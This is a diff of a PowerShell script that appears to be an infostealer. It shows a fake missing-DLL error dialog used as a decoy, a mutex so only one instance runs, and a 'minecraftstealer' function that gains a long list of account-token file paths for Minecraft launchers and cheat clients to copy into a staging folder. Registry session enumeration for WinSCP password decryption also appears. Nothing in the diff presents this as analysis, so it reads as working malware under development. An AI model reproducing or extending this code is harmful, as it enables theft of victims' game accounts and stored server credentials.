@@ -24,11 +24,9 @@ function KDMUTEX {
     if ($fakeerror) {
         [Windows.Forms.MessageBox]::Show("The program can't start because MSVCP110.dll is missing from your computer. Try reinstalling the program to fix this problem.", '', 'OK', 'Error')
     }
-
     $AppId = "62088a7b-ae9f-4802-827a-6e9c921cb48e"
     $CreatedNew = $false
     $script:SingleInstanceEvent = New-Object Threading.EventWaitHandle $true, ([Threading.EventResetMode]::ManualReset), "Global\$AppID", ([ref] $CreatedNew)
-
     if (-not $CreatedNew) {
         throw "[!] An instance of this script is already running."
     }
@@ -484,13 +482,36 @@ function Backup-Data {
 
     # Minecraft 
     function minecraftstealer {
-        $minecraft_session = "$folder_gaming\Minecraft"
-        if (!(Test-Path $minecraft_session)) { return }
-        New-Item -ItemType Directory -Force -Path $minecraft_session | Out-Null
-        $minecraftfolder1 = $env:appdata + "\.minecraft"
-        $minecraftfolder2 = $env:userprofile + "\.lunarclient\settings\game"
-        Get-ChildItem $minecraftfolder1 -Include "*.json" -Recurse | Copy-Item -Destination $minecraft_session 
-        Get-ChildItem $minecraftfolder2 -Include "*.json" -Recurse | Copy-Item -Destination $minecraft_session 
+	$minecraft_session = "$folder_gaming\Minecraft"
+    New-Item -ItemType Directory -Force -Path $minecraft_session | Out-Null
+    $minecraft_paths = @{
+        "Minecraft" = @{
+            "Intent"          = Join-Path $env:userprofile "intentlauncher\launcherconfig"
+            "Lunar"           = Join-Path $env:userprofile ".lunarclient\settings\game\accounts.json"
+            "TLauncher"       = Join-Path $env:userprofile "AppData\Roaming\.minecraft\TlauncherProfiles.json"
+            "Feather"         = Join-Path $env:userprofile "AppData\Roaming\.feather\accounts.json"
+            "Meteor"          = Join-Path $env:userprofile "AppData\Roaming\.minecraft\meteor-client\accounts.nbt"
+            "Impact"          = Join-Path $env:userprofile "AppData\Roaming\.minecraft\Impact\alts.json"
+            "Novoline"        = Join-Path $env:userprofile "AppData\Roaming\.minecraft\Novoline\alts.novo"
+            "CheatBreakers"   = Join-Path $env:userprofile "AppData\Roaming\.minecraft\cheatbreaker_accounts.json"
+            "Microsoft Store" = Join-Path $env:userprofile "AppData\Roaming\.minecraft\launcher_accounts_microsoft_store.json"
+            "Rise"            = Join-Path $env:userprofile "AppData\Roaming\.minecraft\Rise\alts.txt"
+            "Rise (Intent)"   = Join-Path $env:userprofile "intentlauncher\Rise\alts.txt"
+            "Paladium"        = Join-Path $env:userprofile "AppData\Roaming\paladium-group\accounts.json"
+            "PolyMC"          = Join-Path $env:userprofile "AppData\Roaming\PolyMC\accounts.json"
+            "Badlion"         = Join-Path $env:userprofile "AppData\Roaming\Badlion Client\accounts.json"
+        }
+    } 
+    foreach ($launcher in $minecraft_paths.Keys) {
+        foreach ($pathName in $minecraft_paths[$launcher].Keys) {
+            $sourcePath = $minecraft_paths[$launcher][$pathName]
+            if (Test-Path $sourcePath) {
+                $destination = Join-Path -Path $minecraft_session -ChildPath $pathName
+                New-Item -ItemType Directory -Path $destination -Force | Out-Null
+                Copy-Item -Path $sourcePath -Destination $destination -Recurse -Force
+            }
+         }
+      }
     }
     minecraftstealer
 
@@ -653,7 +674,7 @@ function Backup-Data {
     }
     $sessionKeys = Get-RegistrySubKeys -subKey $registryPath
     if ($null -eq $sessionKeys) {
-        Write-Error "[!] Failed to enumerate registry keys under $registryPath"
+        Write-Host "[!] Failed to enumerate registry keys under $registryPath" -ForegroundColor Red
         return
     }
 	function DecryptNextCharacterWinSCP {
